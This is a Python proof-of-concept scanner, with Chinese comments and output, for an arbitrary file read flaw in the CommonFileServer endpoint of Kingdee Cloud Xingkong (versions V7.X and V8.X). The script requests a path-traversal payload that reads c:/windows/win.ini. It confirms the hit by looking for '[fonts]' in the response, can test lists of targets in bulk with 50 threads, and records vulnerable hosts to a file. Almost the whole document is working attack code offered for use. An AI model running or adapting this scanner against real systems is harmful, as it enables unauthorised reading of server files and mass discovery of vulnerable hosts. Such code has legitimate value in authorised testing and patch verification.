# 金蝶云星空 CommonFileServer 任意文件读取漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
     ██╗██╗███╗   ██╗██████╗ ██╗███████╗     ██████╗███████╗███████╗
     ██║██║████╗  ██║██╔══██╗██║██╔════╝    ██╔════╝██╔════╝██╔════╝
     ██║██║██╔██╗ ██║██║  ██║██║█████╗█████╗██║     █████╗  ███████╗
██   ██║██║██║╚██╗██║██║  ██║██║██╔══╝╚════╝██║     ██╔══╝  ╚════██║
╚█████╔╝██║██║ ╚████║██████╔╝██║███████╗    ╚██████╗██║     ███████║
 ╚════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚══════╝     ╚═════╝╚═╝     ╚══════╝

                                        author:果冻                               
                                        影响版本:V7.X、V8.X
"""
    colored_color = colored(test, 'blue')
    print(colored_color)

def main():
    banner()
    parser = argparse.ArgumentParser(description='金蝶云星空 CommonFileServer 任意文件读取漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help='请输入你要检测的url')
    parser.add_argument('-f','--file',dest='file',type=str,help='请输入你要批量检测的文件路径')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api_payload = "/CommonFileServer/c:/windows/win.ini"
    headers = {
        'accept':'*/*',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9'


    }
    try:
        response = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if '[fonts]' in response.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[X]{target} 该网站无法访问")

if __name__ == '__main__':
    main()